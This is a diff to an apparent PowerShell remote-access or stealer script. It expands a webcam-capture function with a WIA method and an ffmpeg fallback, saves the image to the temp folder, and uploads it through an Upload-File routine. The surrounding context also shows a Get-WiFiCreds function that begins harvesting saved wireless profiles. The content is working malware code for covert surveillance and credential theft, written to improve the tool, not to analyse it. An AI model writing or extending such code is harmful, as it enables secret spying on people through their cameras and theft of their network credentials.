@@ -33,26 +33,54 @@ function Connect-ZiPo {
     }
 
     function Capture-Webcam {
-        try {
-            $manager = New-Object -ComObject WIA.DeviceManager
-            foreach ($deviceInfo in $manager.DeviceInfos) {
-                try {
-                    $dev = $deviceInfo.Connect()
-                    $img = $dev.Items.Item(1).Transfer()
-                    $file = "$env:TEMP\webcam_$($deviceInfo.Properties[1].Value).jpg"
-                    $img.SaveFile($file)
-                    return Upload-File $file
-                }
-                catch {
-                    continue
+    try {
+        # WIA попытка
+        $manager = New-Object -ComObject WIA.DeviceManager
+        foreach ($deviceInfo in $manager.DeviceInfos) {
+            try {
+                $dev = $deviceInfo.Connect()
+                $img = $dev.Items.Item(1).Transfer()
+                $file = "$env:TEMP\webcam_$($deviceInfo.Properties[1].Value).jpg"
+                $img.SaveFile($file)
+                return Upload-File $file
+            }
+            catch {
+                continue
+            }
+        }
+
+        # Если WIA не нашла камеры — попытка через ffmpeg
+        $ffmpegPath = "ffmpeg"
+        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
+
+        # Убедимся, что ffmpeg доступен
+        $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
+        if ($LASTEXITCODE -eq 0) {
+            # Найдём название камеры
+            $cameraName = (& cmd /c "$ffmpegPath -list_devices true -f dshow -i dummy" 2>&1) |
+                Select-String "DirectShow video devices" -Context 0,10 |
+                Where-Object { $_.Line -match '"(.*)"' } |
+                ForEach-Object { ($_ -split '"')[1] } |
+                Select-Object -First 1
+
+            if ($cameraName) {
+                # Снимаем кадр
+                Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
+                if (Test-Path $tempImage) {
+                    return Upload-File $tempImage
                 }
             }
-            return "[ERROR] No usable webcam device found"
+            return "[ERROR] ffmpeg fallback failed: no camera device detected"
         }
-        catch {
-            return "[ERROR] Failed to enumerate webcam devices"
+        else {
+            return "[ERROR] No usable webcam device found via WIA, and ffmpeg is not available"
         }
     }
+    catch {
+        return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
+    }
+}
+
 
     function Get-WiFiCreds {
         $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
